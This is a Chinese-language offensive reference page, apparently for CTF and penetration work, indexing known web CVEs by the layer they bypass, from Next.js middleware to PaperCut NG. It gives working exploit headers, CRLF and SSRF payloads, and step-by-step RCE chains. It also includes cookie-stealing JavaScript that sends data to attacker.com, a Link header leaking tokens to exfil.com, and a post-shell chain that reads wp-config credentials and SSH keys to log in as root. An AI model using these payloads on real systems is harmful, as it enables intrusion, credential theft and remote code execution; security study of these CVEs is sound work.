---

phase: webapp
vuln_class: [cve, middleware-bypass, crlf, ssrf]
title: Web 框架与产品已知漏洞索引
summary: 按「绕的是哪一层」归类的 CVE 与 N-day：路由中间件层、HTTP 协议层、客户端层、反序列化层。每条的判据是「能不能在版本指纹上先确认命中」。
---

# Web 框架与产品已知漏洞索引

Node.js 生态专属漏洞（flatnest、happy-dom、原型链 gadget）见 [[web/漏洞分类/Node.js 沙箱逃逸与原型链 RCE.md|node-and-prototype.md]]；反序列化原语与 Flight 协议的完整利用链见 [[web/漏洞分类/注入类/服务端高级技巧.md|server-side-advanced]] 与 [[web/漏洞分类/注入类/反序列化与竞争条件.md|反序列化]]；JWT 算法混淆见 [[web/漏洞分类/认证与会话/JWT 与 JWE 令牌攻击.md|auth-jwt.md]]；SAML 断言伪造见 [[web/漏洞分类/认证与会话/联邦认证与身份基础设施攻击.md|auth-infra.md]]。

## 0. 判据速查

拿到一个目标，先按**组件指纹**对号入座，再决定打哪条。绝大多数 N-day 的失败原因不是 payload 不对，是**版本不对**。

| 绕的层 | 组件 | 一句话判据 | 去哪节 |
|---|---|---|---|
| 路由/中间件 | Next.js | `x-middleware-subrequest` 头让中间件自我跳过 | §1.1 |
| 路由/中间件 | PaperCut NG | `/app?service=page/SetupCompleted` 免认证进后台 | §5.2 |
| 路由/中间件 | Gogs | 软链接 + 仓库写入 → 任意文件写 | §5.3 |
| HTTP 协议 | Uvicorn | 响应头不过滤 CRLF | §2.1 |
| HTTP 协议 | CherryPy | RFC 2047 头解码产生 CRLF | §2.3 |
| HTTP 协议 | Waitress | 非法 method 被回显进错误页 | §2.4 |
| HTTP 协议 | curl | `.netrc` 凭证跟着重定向走 | §2.2 |
| 客户端 | Chrome | `Link: rel=preload` 带 `referrerpolicy` 泄露完整 URL | §3.1 |
| 客户端 | Puppeteer | `setJavaScriptEnabled(false)` 只作用于当前 context | §3.2 |
| 客户端 | Deno | 原型污染注入 `deno.json` 改 importMap | §3.3 |
| 反序列化 | RSC Flight | `Next-Action` + `Accept: text/x-component` | §4.1 |
| 反序列化 | ExifTool | DjVu 的 ANTa 注解走 Perl `eval` | §4.2 |
| 反序列化 | WeasyPrint | `rel="attachment"` 绕过内部 fetcher 检查 | §4.3 |
| 签名/XML | ruby-saml | XPath 找到藏在 `StatusDetail` 里的伪造 digest | §4.4 |
| SQL | Zabbix | trapper 10051 的 `clientip` 字段未过滤 | §5.1 |
| 认证逻辑 | 通用 | `if sha256(x)` 恒真，压根没比较 | §5.4 |

## 1. 路由与中间件层

### 1.1 Next.js 中间件绕过（CVE-2025-29927）

**影响**：Next.js < 14.2.25，15.x < 15.2.3

中间件（`middleware.ts`）里常放鉴权，而框架为防止中间件递归调用提供了跳过机制 —— 请求头里写够层数就直接不执行。

```http
GET /admin HTTP/1.1
Host: target
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

要点：

- 层数不够不生效，**默认写 5 层**（对应 Next.js 的递归深度上限）。某些版本需写成 `src/middleware:src/middleware:...`。
- 这不是「伪造已认证」，而是**中间件根本没跑** —— 所以只在「鉴权全靠 middleware」的架构上有效；若路由 handler 内部还有一层校验，绕过后仍是 401。
- 判据：加头前后同一受保护 URL 的状态码从 302/401 变成 200。

**串联 SSRF**：绕过之后若端点会把 `Location` 头拿去内部 fetch，就是现成的 SSRF：

```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     -H "Location: http://backend:4000/flag" \
     https://target/api/login
```

## 2. HTTP 协议层

共同点：**两个组件对同一段字节的边界理解不同**。这一类在 WAF 前面特别有效，因为 WAF 看到的和源站看到的不是同一个请求。

### 2.1 Uvicorn 响应头 CRLF 注入（未修 N-day）

**影响**：Uvicorn（FastAPI 默认 ASGI server）不校验响应头里的 `\r\n`。

```python
payload = {"headers": {"lol\r\n\r\n<script>evil()</script>": "x"}}
requests.get(f'{HOST}/api/health', params={"test": json.dumps(payload)})
```

三种利用：

1. **CSP 绕过** —— 注入 `Content-Security-Policy: default-src *` 覆盖原策略
2. **缓存投毒** —— `\r\n\r\n` 提前结束头，后面全变 body，Nginx 把攻击者内容缓存
3. **XSS** —— 同上，body 里是可控 HTML

判据：FastAPI/Uvicorn 后端 + 某个端点把用户输入塞进了响应头（哪怕是自定义的调试头）。

### 2.2 curl `.netrc` 凭证随重定向外泄（CVE-2025-0167）

`~/.netrc` 里按 host 存的凭证，在 A 站重定向到 B 站后，如果 B 站回 `401 + WWW-Authenticate: Basic`，curl 会把 **A 的凭证发给 B**。

```python
@app.route('/<path:path>')
def leak(path):
    return '', 401, {'WWW-Authenticate': 'Basic realm="leak"'}
```

判据：目标服务端会用 curl 去访问用户提供的 URL（webhook 测试、URL 预览、图片抓取）。攻击者只要让第一跳是自己的域名，就能收到第二跳的 `Authorization`。

### 2.3 CherryPy RFC 2047 头解码 → 请求走私

CherryPy 会解码 RFC 2047 编码的头值，解码结果里的 CRLF 直接进入下一个请求：

```python
payload = b"value\r\n\r\nGET /second HTTP/1.1\r\nHost: backend\r\n"
encoded = f"=?ISO-8859-1?B?{base64.b64encode(payload).decode()}?="
```

同一个原语在 Java 侧有 Angus Mail、在 Python 侧有 email 库 —— 凡是「头值要按 RFC 2047 解码」的实现都要测。

### 2.4 Waitress WSGI Cookie 外带

Waitress 把非法 HTTP method 原样回显在错误页里。把 cookie 值挪到 method 位置（CRLF 拆请求），错误页就会把它打出来 —— **绕过 HttpOnly**。

### 2.5 TCP 分段绕过防火墙

把被拦的关键字拆到两个 TCP 包，中间件只做单包匹配就会漏：

```python
s = socket.socket(); s.connect((host, port))
s.send(b"GET /fla")
s.send(b"g.html HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
```

比 HTTP 层拆包更底层，对只做 L7 单包正则的设备有效。加 `Range: bytes=135-` 之类还能配合偏移读取。

### 2.6 同端口协议复用

题目说「端口不够用」「只有一个端口」时，先试协议复用：服务端常按首字节分流（`SSH-` 开头走 SSH，其余走 HTTP）。

```bash
ssh -p 80 user@host      # HTTP 端口上直接连 SSH
```

凭证常藏在 HTML 注释里 —— 有 web 访问权就先翻源码注释。

## 3. 客户端层

### 3.1 Chrome `Link` 头 referrer 泄露

```http
HTTP/1.1 200 OK
Link: <https://exfil.com/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
```

Chrome 按这个头去预加载，且**按头里指定的策略**发 `Referer` —— 完整 URL 被送出去。若当前页是 `/auth/callback?token=secret`，token 直接落到攻击者日志里。

判据：目标有「用户可控的响应头」或「Markdown/HTML 注入能写 `<link>`」，且当前页 URL 带敏感 query。

### 3.2 Puppeteer `setJavaScriptEnabled(false)` 绕过

只影响**当前 context**。从 iframe 里 `window.open()` 出来的新窗口，JS 是开着的：

```javascript
// 在受限页面里注入
const w = window.open('https://target.com/page');
// 新窗口的 JS 正常执行，可读取同源数据
```

判据：bot 代码里出现 `setJavaScriptEnabled(false)` 且允许 iframe。

### 3.3 Deno import map 劫持

Deno v1.18+ 自动发现 `deno.json`。原型污染进去就能改模块解析地址：

```javascript
({}).__proto__["deno.json"] = '{"importMap": "https://evil.com/map.json"}'
```

同一思路适用于任何「从配置对象按 key 取值」的运行时 —— 污染的 key 是配置文件名本身就是攻击面。

## 4. 反序列化与签名层

### 4.1 React Server Components Flight 协议 RCE（CVE-2025-55182 / CVE-2025-66478）

**影响**：React Server Components / Next.js

Flight 是 RSC 的流式序列化格式，支持 `$` 前缀的特殊引用。构造假 chunk 沿 `constructor → constructor → Function` 走到任意服务端 JS 执行；另一变体走 `__proto__:then`。

```http
POST / HTTP/1.1
Next-Action: <任意 action id>
Accept: text/x-component
Content-Type: text/plain;charset=UTF-8
```

完整利用链见 [[web/漏洞分类/注入类/服务端高级技巧.md|server-side-advanced]] §4.5。

判据：响应头/请求头出现 `Next-Action`、`text/x-component`，或页面 HTML 里带 `self.__next_f.push`。

### 4.2 ExifTool DjVu Perl 注入（CVE-2021-22204）

**影响**：ExifTool ≤ 12.23

DjVu 的 `ANTa` 注解块内容会被 Perl 解析。构造带 `(metadata "...")` 的最小 DjVu，任何「上传图片 → 服务端跑 exiftool」的端点都变成 RCE。

利用代码见 [[web/漏洞分类/注入类/服务端高级技巧.md|server-side-advanced]]。

### 4.3 WeasyPrint attachment SSRF / 任意文件读（CVE-2024-28184）

WeasyPrint 处理 `<a rel="attachment">` 和 `<link rel="attachment">` 时会去 fetch 目标 URL 并把结果作为 PDF 附件嵌入，而**内部的 fetcher 检查（如 `X-Fetcher`）不作用于附件抓取**。

```html
<a rel="attachment" href="http://127.0.0.1/admin/flag">x</a>
<link rel="attachment" href="file:///flag.txt">
```

三种用法：

1. **SSRF** —— 从 localhost 抓，绕过 IP 限制
2. **任意文件读** —— `file://` 直接嵌入 PDF
3. **布尔 oracle** —— 只有目标返回 200 才会出现 `/Type /EmbeddedFile`，用它盲测

```bash
pdfdetach -list output.pdf
pdfdetach -save 1 -o flag.txt output.pdf
```

判据：`requirements.txt` 里有 WeasyPrint，且有「HTML/URL 转 PDF」功能。

### 4.4 ruby-saml XPath digest 走私（CVE-2024-45409）

**影响**：GitLab < 17.3.3（ruby-saml），启用 SAML SSO

签名校验用 XPath 找 digest 节点，而 XPath 会被「文档里先出现的同名节点」命中。把伪造的 digest 塞进 `StatusDetail`，校验器就验它，业务逻辑却读原始的 Assertion。

```text
1. 从合法 SAML 响应里取 IdP metadata 的签名
2. 构造断言，NameID 改成目标用户（如 akadmin）
3. 把断言的 ID 改成与 metadata 的 Reference URI 一致
4. 算出正确 digest，放进 <StatusDetail>
5. POST 到 /users/auth/saml/callback
```

判据：`/users/auth/saml` 存在且 GitLab 版本 < 17.3.3。

### 4.5 签名覆盖范围错位（通用模式）

`ruby-saml` 是 XPath 选错节点，`auth-infra` 里的 Base64 宽容是解码与解析作用域不同 —— **本质都是「验签的对象」和「使用的对象」不是同一段数据**。遇到任何「签名 + 数据拼接」的接口，先找这个错位。

## 5. 产品级已知漏洞

### 5.1 Zabbix trapper 时间盲注（CVE-2024-22120）

**影响**：Zabbix，trapper 端口 10051 暴露

trapper 协议的 `clientip` 字段未过滤，写进审计日志时触发时间盲注。

```text
1. 用 guest 登录前端，base64 解 cookie 拿 sessionid
2. 向 10051 发带恶意 clientip 的 trapper 包，按 sleep 时长逐字符外带
3. 拿到 admin 的 sessionid
4. 走 Zabbix API 提权：script.create + script.execute → RCE
```

坑：外带结果里可能混入 `\r` 之类的不可见字符。**用之前先断言 sessionid 恰好是 32 位 hex**，否则会拿一个永远认证失败的串反复重试。

### 5.2 PaperCut NG 免认证进后台 + RCE（CVE-2023-27350）

**影响**：PaperCut NG < 22.0.9（CVSS 9.8）

```text
1. GET /app?service=page/SetupCompleted  → 直接拿到管理员会话
2. Config Editor 里开 print-and-device.script.enabled，关 print.script.sandboxed
3. 打印机设置里注入 RhinoJS：
   java.lang.Runtime.getRuntime().exec(["/bin/bash","-c","CMD"])
4. 结果走 HTTP 回调 base64 外带
5. 内网横向：curl -x http://TARGET:3128 http://127.0.0.1:9191/app
```

要点：`SetupCompleted` 是安装向导的收尾页，正常部署完应该不可达 —— **它可达就说明部署未收尾**。3128 的 Squid 常与 PaperCut 同机，是天然的横向代理。

### 5.3 Gogs 软链接 RCE（CVE-2025-8110）

有仓库写权限时，提交一个指向目标路径的软链接，再通过 Git 操作让服务端跟着写 —— 落到 `.git/hooks` 或模板目录即可执行。完整构造见 [[web/漏洞分类/注入类/代码执行与命令执行.md|server-side-exec]]。

### 5.4 认证逻辑恒真（`if sha256(x)`）

```python
# 错误写法：hexdigest() 返回非空字符串，在 Python 里恒为真
if hashlib.sha256(pw.encode()).hexdigest():
    return login_ok()          # 压根没比较

# 正确写法
if hashlib.sha256(pw.encode()).hexdigest() == stored_hash:
```

同类变体：`if user_hash == stored_hash or debug`、`if not (a != b)`、PHP 的 `if (md5($x))`、JS 的 `if (crypto.createHash(...))`（对象恒真）。

判据：审计时搜 `if <hash_expr>:` 后面**没有比较运算符**的地方。运行时判据是任意密码都能登录。

### 5.5 Apache 2.2.x HttpOnly Cookie 泄露（CVE-2012-0053）

**影响**：Apache 2.2.0 – 2.2.21

Cookie 头超过 4KB 触发 400，而 400 的错误页会把**整个 Cookie 头**回显出来，包括 HttpOnly 的。

```javascript
// 先把自己的 cookie 撑爆，再请求目标，从 400 页面里读回全部 cookie
document.cookie = "padding=" + "A".repeat(4000);
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://target:8080/", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    var cookies = xhr.responseText.match(/Cookie:.*$/m);
    new Image().src = "http://attacker.com/steal?c=" + encodeURIComponent(cookies);
  }
};
xhr.send();
```

需要同源 XSS 配合 —— 它的价值是**把 HttpOnly 从「不可读」变成「可读」**。判据只看 `Server: Apache/2.2.x`。

### 5.6 WordPress RevSlider 任意上传（CVE-2014-9734）

**影响**：Slider Revolution ≤ 3.0.95，`update_plugin` admin-ajax 动作免认证可打。

版本指纹不看后台（后台常被锁），直接读插件自己写的日志：

```bash
curl https://target/wp-content/plugins/revslider/release_log.txt
```

拿到 shell 后的经典纵向链：

```bash
# 1. 从 wp-config.php 取库凭证
grep -E "DB_(NAME|USER|PASSWORD|HOST)" /var/www/wp-config.php

# 2. 用库账号 load_file() 读任意 world-readable 文件
#    （老版本默认给 WP 用户授了 FILE 权限）
mysql -h <db_host> -u wordpress -p -e "SELECT load_file('/backup/id_rsa')"

# 3. 用读到的私钥 SSH 上去
chmod 400 rsa.key && ssh -i rsa.key root@<web_host>
```

要点：`load_file()` 是**数据库进程的权限**在读文件，不受 web 用户限制，但要求 `FILE` 权限 + `secure_file_priv` 允许 + 文件 world-readable。三个条件缺一不可，先在低权限 shell 里 `SHOW VARIABLES LIKE 'secure_file_priv'` 确认。

## 6. 组件指纹清单

按顺序过一遍，命中哪个查哪节。

1. **依赖清单** —— `package.json` / `requirements.txt` / `Pipfile` / `go.mod` / `Dockerfile`（镜像 tag 也是版本）
2. **响应头** —— `Server`、`X-Powered-By`、`Next-Action`、`X-Nextjs-*`
3. **ASGI/WSGI server** —— Uvicorn（§2.1）、Waitress（§2.4）、CherryPy（§2.3）
4. **有 URL 抓取功能** —— curl `.netrc`（§2.2）、WeasyPrint（§4.3）、任何「预览/截图/转 PDF」
5. **有图片处理** —— ExifTool（§4.2）、ImageMagick、Pillow
6. **有 SSO** —— GitLab + SAML（§4.4）、OAuth/OIDC（见 auth-infra）
7. **有 RSC/Next.js** —— `__next_f`、`Next-Action`（§4.1）
8. **暴露的管理端口** —— Zabbix 10051（§5.1）、PaperCut 9191/3128（§5.2）、Jenkins 8080
9. **PHP 生态** —— WordPress 插件版本日志（§5.6）
10. **老 Apache** —— `Server: Apache/2.2.2x`（§5.5）

## 7. 纪律

- **先确认版本，再发 payload**。N-day 的绝大多数失败是版本不匹配，不是 payload 写错。指纹拿不到就别硬打。
- **中间件绕过不等于认证绕过**。`x-middleware-subrequest` 只是让中间件不跑，路由内部若有二次校验照样拦。
- **CRLF 类的价值在「让上游和下游看到不同请求」**。打 WAF 比打应用有用，配合缓存投毒比直接 XSS 有用。
- **`rel="attachment"` 这类「旁路抓取」优先于常规 SSRF**。内部 fetcher 的黑名单往往只加在主路径上，附件/预览/缩略图路径经常被忘掉。
- **验签类漏洞统一看「签的和用的是不是同一段数据」**。XPath 选错节点、Base64 宽容丢字符、参数解析后值胜出，都是同一个错位。
- **拿 shell 后第一件事是找纵向凭证**，不是继续挖洞。`wp-config.php`、`/dev/shm`、CI/CD 变量、堡垒机连接库，按这个顺序翻。
